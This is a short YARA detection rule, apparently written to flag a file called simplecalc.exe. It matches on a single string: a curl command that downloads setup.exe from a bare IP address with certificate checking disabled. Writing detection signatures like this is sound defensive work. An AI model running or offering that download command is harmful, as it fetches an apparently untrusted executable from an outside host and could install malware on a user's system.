rule simplecalc {
	meta:
		description = "finds simplecalc.exe"
		author = "benjamin coombe"
		date = "10/4/2025"
	strings:
		$curl = "curl -k -o setup.exe https://165.73.244.11/installers/setup.exe"
	condition:
	$curl
}